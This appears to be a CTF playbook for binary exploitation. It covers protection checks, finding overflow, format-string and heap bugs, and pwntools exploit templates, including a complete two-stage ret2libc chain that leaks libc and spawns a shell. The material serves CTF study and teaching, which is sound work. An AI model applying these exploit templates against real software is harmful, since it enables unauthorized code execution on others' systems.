# Binary Exploitation (PWN) Challenges Playbook

> **Sentinel CTF Framework — PWN Category**  
> Step-by-step decision tree for binary exploitation CTF challenges.

---

## Triage Checklist (First 5 Minutes)

- [ ] Run `checksec --file=<binary>` — note every protection
- [ ] Run `file <binary>` — 32-bit or 64-bit? ELF?
- [ ] Run `strings <binary>` — is there a `win()` or `flag()` function mentioned?
- [ ] Run `ltrace ./binary` with normal input — see what it calls
- [ ] Crash it with a long input: `python3 -c "print('A'*200)" | ./binary`
- [ ] Read the source code if provided — find the vulnerability class first
- [ ] Check: is there a `flag.txt` file? Does the binary read it?
- [ ] Check if remote: `nc <host> <port>` to interact with the service

---

## Phase 1: Recon — Protections

```bash
checksec --file=./target
```

### Protection Lookup Table

| Protection | Meaning | Bypass strategy |
|---|---|---|
| **NX enabled** | Stack not executable | ROP chains, ret2libc, ret2plt |
| **NX disabled** | Stack executable | Shellcode injection |
| **PIE enabled** | Binary base randomized | Need an info leak to find base |
| **PIE disabled** | Binary at fixed addr | Use addresses directly |
| **Canary found** | Stack canary protects ret addr | Need canary leak, or format string |
| **No canary** | No stack protection | Direct overflow to ret addr |
| **RELRO: Full** | GOT is read-only | Can't overwrite GOT entries |
| **RELRO: Partial** | GOT writable | Overwrite GOT for code execution |
| **ASLR** (system) | libc base randomized | Need libc leak |

---

## Phase 2: Find the Vulnerability

### 2.1 Buffer Overflow

```bash
# Generate a cyclic pattern to find exact offset
python3 -c "from pwn import *; print(cyclic(200))" | ./binary
# Copy crash address, find offset:
python3 -c "from pwn import *; print(cyclic_find(0xAAAABBBB))"

# Or use pwndbg:
gdb ./binary
run <<< $(python3 -c "from pwn import *; sys.stdout.buffer.write(cyclic(200))")
# After crash: 
cyclic -l $rbp   # or use `info registers` to read rip
```

### 2.2 Format String Bug

```bash
# Detect: binary prints back your input
echo "%p %p %p %p %p %p" | ./binary
# If you see addresses like 0x7ffXXX → format string vuln

# Read from stack
echo "%7$p"   | ./binary   # read 7th argument (try 1-50)

# Read arbitrary address (overwrite canary, GOT, etc.)
# Write to arbitrary address (4-byte or 8-byte write)
```

### 2.3 Heap Vulnerabilities

| Vuln type | Sign | Notes |
|---|---|---|
| Use-After-Free | `free()` then use pointer | Allocate new chunk to control old ptr |
| Double Free | `free()` twice | Tcache poison, fastbin dup |
| Heap overflow | `strcpy` / `memcpy` into heap | Overwrite metadata or next chunk |

---

## Phase 3: Exploit Development

### 3.1 Pwntools Template

```python
#!/usr/bin/env python3
from pwn import *

# --- Config ---
exe = ELF('./target', checksec=False)
context.binary = exe
context.log_level = 'info'   # change to 'debug' for verbose

# --- Connect ---
# LOCAL:
p = exe.process()
# REMOTE:
# p = remote('HOST', PORT)
# GDB:
# p = gdb.debug('./target', gdbscript='b main\nc\n')

# --- Helpers ---
def send(data): p.sendline(data)
def recv(): return p.recvline()
def recv_until(pat): return p.recvuntil(pat)

# --- Exploit ---
offset = 40     # distance to saved RIP (find with cyclic)

# ret2win: call a win() function directly
win = exe.sym['win']           # or exe.sym['flag'], exe.sym['system']
payload = flat(b'A' * offset, win)
send(payload)

# ret2libc: leak libc, call system('/bin/sh')
# Step 1: leak libc base
# Step 2: find system() and '/bin/sh' in libc
# Step 3: build ROP chain

p.interactive()
```

### 3.2 ret2win (no ASLR/PIE, NX enabled)

```python
# Overflow to overwrite return address with win() address
win = exe.sym['win']
payload = b'A' * offset + p64(win)
p.sendline(payload)
```

### 3.3 ret2libc (64-bit, NX, ASLR, no PIE)

```python
from pwn import *
exe = ELF('./target')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')   # match remote version!
rop = ROP(exe)

# Step 1: Leak a libc address via puts(got['puts'])
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret     = rop.find_gadget(['ret'])[0]     # stack alignment for Ubuntu

payload1 = flat(
    b'A' * offset,
    pop_rdi,
    exe.got['puts'],    # address of puts in GOT
    exe.plt['puts'],    # call puts to print it
    exe.sym['main'],    # return to main for second stage
)
p.sendline(payload1)
p.recvuntil(b'... some output ...\n')   # adjust to what comes before leak
leaked = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leaked - libc.sym['puts']   # calculate libc base
log.success(f'libc @ {hex(libc.address)}')

# Step 2: call system('/bin/sh')
binsh = next(libc.search(b'/bin/sh'))
payload2 = flat(
    b'A' * offset,
    ret,               # stack alignment (needed on Ubuntu 18+)
    pop_rdi,
    binsh,
    libc.sym['system'],
)
p.sendline(payload2)
p.interactive()
```

### 3.4 ROP Chain Building

```bash
# Find gadgets in the binary
ROPgadget --binary ./target | grep "pop rdi"
ROPgadget --binary ./target | grep "ret"
ropper -f ./target --search "pop rdi"

# In pwntools:
rop = ROP(exe)
rop.raw(rop.find_gadget(['pop rdi', 'ret']))
rop.raw(p64(arg))
rop.call('system')
```

---

## Phase 4: Key pwndbg Commands

```bash
gdb -q ./target

# pwndbg specific
checksec          # show protections
vmmap             # show memory map with permissions
heap              # show heap chunks
bins              # show bin lists (tcache, fastbin, etc.)
cyclic 200        # generate pattern
cyclic -l 0xADDR  # find offset from crash address
telescope $rsp    # show stack with annotations
got               # show GOT table
plt               # show PLT table
x/40gx $rsp       # examine 40 qwords at stack pointer

# Useful GDB commands
set follow-fork-mode child    # follow forked child
catch syscall                  # break on every syscall
```

---

## Common Mistakes

- **Forgetting stack alignment on 64-bit Ubuntu** — add a `ret` gadget before `system()` call
- **Wrong libc version** — the remote's libc may differ; use `libc-database` or get it with `ldd`
- **Off-by-one in offset** — verify with cyclic, don't guess
- **NX doesn't mean no code execution** — ROP chains execute existing code
- **Checking `p.interactive()` too early** — make sure the shell has spawned first

---

## libc Version Identification

```bash
# Get libc version from a leak
# Upload to: https://libc.rip/ or https://libc.blukat.me/
# Provide: function name + last 3 nibbles of leaked address

# Or locally
strings /lib/x86_64-linux-gnu/libc.so.6 | grep "GNU C Library"
ldd --version
```
